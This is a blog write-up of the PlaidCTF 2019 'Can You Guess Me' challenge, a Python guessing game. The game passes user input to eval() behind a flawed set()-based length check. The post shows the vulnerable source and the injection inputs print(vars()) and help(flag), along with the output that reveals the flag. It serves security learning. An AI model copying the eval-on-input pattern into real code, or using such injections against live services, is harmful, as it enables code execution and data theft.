<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>PlaidCTF2019: Can You Guess Me</title><meta property="og:title" content="PlaidCTF2019: Can You Guess Me"><meta name=twitter:title content="PlaidCTF2019: Can You Guess Me"><meta name=description content="Code injection in a simple python application"><meta property="og:description" content="Code injection in a simple python application"><meta name=twitter:description content="Code injection in a simple python application"><meta name=author content="Morgaine Timms"><link href=https://timms.io/logo.ico rel=icon type=image/x-icon><meta property="og:url" content="https://timms.io/ctf/2019/plaid/can-you-guess-me/"><meta property="og:type" content="website"><meta property="og:site_name" content="TimmsIO"><link rel=canonical href=https://timms.io/ctf/2019/plaid/can-you-guess-me/><link rel=stylesheet href=/style.main.min.080192c78542581b270a9b4bebb2662b6e9afa748d49b35b95d078f750c6b46c.css media=screen></head><body><nav id=primary-nav class="navbar is-black" role=navigation aria-label="main navigation"><div class=container><div class=navbar-brand><a class=navbar-item href=https://timms.io><img src=/logo.svg alt=TimmsIO><span class="site-title is-size-4" style=padding-left:1rem;padding-right:1rem>|| TimmsIO</span></a><div role=button class="navbar-burger burger" aria-label=menu aria-expanded=false data-target=navbarMenu><span aria-hidden=true></span><span aria-hidden=true></span><span aria-hidden=true></span></div></div><div class=navbar-menu id=navbarMenu><div class=navbar-start></div><div class=navbar-end><a class=navbar-item title=About href=/#contact>About</a><div class="navbar-item has-dropdown"><a class=navbar-link title=Posts>Posts</a><div class=navbar-dropdown><a class=navbar-item title=Blog href=/categories/blog/>Blog</a>
<a class=navbar-item title=Writeups href=/categories/writeups/>Writeups</a>
<a class=navbar-item title=CTFs href=/categories/ctfs>CTFs</a><hr class=navbar-divider><a class=navbar-item title=All href=/posts>All</a></div></div><a class=navbar-item title=Projects href=/projects>Projects</a></div></div></div></nav><div class=page-blocks></div><section class="hero is-medium" style=background-image:url(/image/abstract-black-and-white-cotton-2247157_hu3d03a01dcc18bc5be0e67db3d8d209a6_10290741_1600x1600_fit_q75_box.jpg)><div class="container hero-body has-text-centered" style="text-shadow:-1px 0 #000,0 1px #000,1px 0 #000,0 -1px #000"><h1 class="title is-1 has-text-white">PlaidCTF2019: Can You Guess Me</h1></div></section><div class="columns is-gapless is-desktop"><div class=column><section class="section container content"><div class="tio-page columns is-centered"><div class="column is-four-fifths-tablet is-three-quarters-widescreen has-background-dark has-text-light"><h1 id=plaidctf2019-can-you-guess-me>PlaidCTF2019 - Can You Guess Me</h1><p>Misc - 100pts</p><h2 id=the-challenge>The Challenge</h2><p>The challenge text leads to the python code running the challenge.</p><p><blockquote><p>Misc (100 pts)
Here&rsquo;s the source to a guessing game: here</p></p><p>You can access the server at</p><p>nc canyouguessme.pwni.ng 12349</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#! /usr/bin/env python3</span>

<span style=color:#f92672>from</span> sys <span style=color:#f92672>import</span> exit
<span style=color:#f92672>from</span> secret <span style=color:#f92672>import</span> secret_value_for_password, flag, <span style=color:#66d9ef>exec</span>

<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;  ____         __   __           ____                     __  __       &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34; / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;| |   / _` | &#39;_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \ &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/ &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34; \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___| &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;                                                                       &#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#34;</span>)
<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#34;</span>)

<span style=color:#66d9ef>try</span>:
    val <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
    inp <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Input value: &#34;</span>)
    count_digits <span style=color:#f92672>=</span> len(set(inp))
    <span style=color:#66d9ef>if</span> count_digits <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>10</span>:          <span style=color:#75715e># Make sure it is a number</span>
        val <span style=color:#f92672>=</span> eval(inp)
    <span style=color:#66d9ef>else</span>:
        <span style=color:#66d9ef>raise</span>

    <span style=color:#66d9ef>if</span> val <span style=color:#f92672>==</span> secret_value_for_password:
        <span style=color:#66d9ef>print</span>(flag)
    <span style=color:#66d9ef>else</span>:
        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Nope. Better luck next time.&#34;</span>)
<span style=color:#66d9ef>except</span>:
    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Nope. No hacking.&#34;</span>)
    exit(<span style=color:#ae81ff>1</span>)</code></pre></div><h2 id=the-solution>The Solution</h2><p>The exploitable flaw in &lsquo;Can You Guess Me&rsquo; is twofold:
1. the use of <a href=https://docs.python.org/3/library/functions.html#eval>python&rsquo;s <code>eval()</code> built-in function</a>; and
2. ineffective input sanitisation <a href=https://docs.python.org/3/library/functions.html#func-set>using python&rsquo;s <code>set()</code> built-in cast function</a></p><p><code>set()</code> counts unique elements, and allows for the use longer input <em>as long as there are repeated characters</em>. For example:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> len(set(<span style=color:#e6db74>&#34;aaaaaaaaaaaaaaaa&#34;</span>))
<span style=color:#ae81ff>1</span></code></pre></div><p>The input <code>print(vars())</code> is sufficient to bypass the ineffective sanitisation.</p><p><p>There are also other python commands which fit under the character limit without using the <code>set()</code> flaw.
<code>help(flag)</code> produces a very helpful error message:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>Input value: help(flag)
No Python documentation found for &#39;PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}&#39;.
Use help() to get the interactive help utility.
Use help(str) for help on the str class.</p>

<p>Nope. Better luck next time.</code></pre></div></p></div></div></section></div></div><link href=https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet integrity=sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN crossorigin=anonymous><noscript><style>.navbar-burger-toggle+.navbar-burger{margin-top:-3.5em}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(1){transform:translateY(5px)rotate(45deg)}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(2){opacity:0}.navbar-burger-toggle:checked+.navbar-burger span:nth-child(3){transform:translateY(-5px)rotate(-45deg)}.navbar-burger-toggle:checked~.navbar-menu{display:block}</style></noscript><script>'use strict';document.addEventListener('DOMContentLoaded',function(){var $dropdowns=getAll('.navbar-item.has-dropdown:not(.is-hoverable)');if($dropdowns.length>0){$dropdowns.forEach(function($el){$el.addEventListener('click',function(event){event.stopPropagation();$el.classList.toggle('is-active');});});document.addEventListener('click',function(event){closeDropdowns();});}
function closeDropdowns(){$dropdowns.forEach(function($el){$el.classList.remove('is-active');});}
document.addEventListener('keydown',function(event){var e=event||window.event;if(e.keyCode===27){closeDropdowns();}});var $burgers=getAll('.burger');if($burgers.length>0){$burgers.forEach(function($el){$el.addEventListener('click',function(){var target=$el.dataset.target;var $target=document.getElementById(target);$el.classList.toggle('is-active');$target.classList.toggle('is-active');});});}
function getAll(selector){return Array.prototype.slice.call(document.querySelectorAll(selector),0);}});</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-77343548-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}
gtag('js',new Date());gtag('config','UA-77343548-1');</script></body></html>